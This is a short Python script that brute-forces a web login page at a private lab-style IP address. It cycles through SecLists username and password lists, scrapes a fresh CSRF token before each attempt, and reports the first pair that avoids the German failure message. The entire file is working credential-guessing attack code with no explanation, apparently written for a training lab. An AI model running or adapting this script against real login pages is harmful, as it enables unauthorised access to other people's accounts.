#!/usr/bin/env python3
import requests
import re
import sys

def bruteforcer():
        session = requests.session()
        with open("./SecLists/Passwords/Common-Credentials/top-passwords-shortlist.txt", "r") as file:
                passwords = [line.strip() for line in file.readlines()]
        with open("./SecLists/Usernames/top-usernames-shortlist.txt", "r") as file:
                usernames = [line.strip() for line in file.readlines()]

        for username in usernames:
                for password in passwords:
                        login = session.get("http://10.10.152.108/login.php")
                        user_token = re.search("'user_token' value='(.*?)'", login.text).group(1)
                        post_data = {
                                "username" : username,
                                "password" : password,
                                "Login" : "Login",
                                "user_token" : user_token
                        }
                        validation = session.post("http://10.10.152.108/login.php", data=post_data)
                        if "Login fehlgeschlagen" in validation.text:
                                #print("Nope")
                                pass
                        elif "CSRF token" in validation.text:
                                print("CSRF problem")
                                sys.exit()
                        else:
                                print(f"gotcha!\n {username}:{password}")
                                sys.exit()

if __name__ == ("__main__"):
        print("start")
        bruteforcer()
        print("stop")